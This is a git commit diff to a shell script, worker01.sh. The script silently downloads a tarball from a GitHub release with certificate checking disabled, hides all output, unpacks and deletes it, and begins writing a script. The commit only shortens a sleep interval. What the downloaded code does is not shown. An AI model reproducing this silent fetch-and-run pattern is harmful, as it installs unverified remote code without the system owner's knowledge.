e17d60f4c7466e7d393ae4a1e263335efaa7eb28
wijayasuta13-collab <wijayasuta13@gmail.com>
2026-08-28 07:08:09 +0700

    Update worker01.sh

--- worker01.sh
+++ worker01.sh
@@ -3,7 +3,7 @@
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
-sleep 3600
+sleep 30
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
